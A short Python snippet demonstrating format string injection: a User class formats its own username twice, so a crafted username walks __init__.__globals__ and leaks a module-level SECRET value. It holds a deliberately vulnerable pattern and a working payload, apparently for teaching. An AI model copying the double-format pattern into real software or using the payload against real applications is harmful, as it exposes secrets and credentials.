```py -cwn
# Leak datas 
SECRET = 'YOUGOTME'

class User():
    def __init__(self, id, username):
        self.id = id
        self.username = username
    def __repr__(self):
        return '<User {u.username} (id {{i.id}})>'.format(u=self).format(i=self) # format string injection
user = User(0, '{i.__init__.__globals__[SECRET]}')
print(user)
```
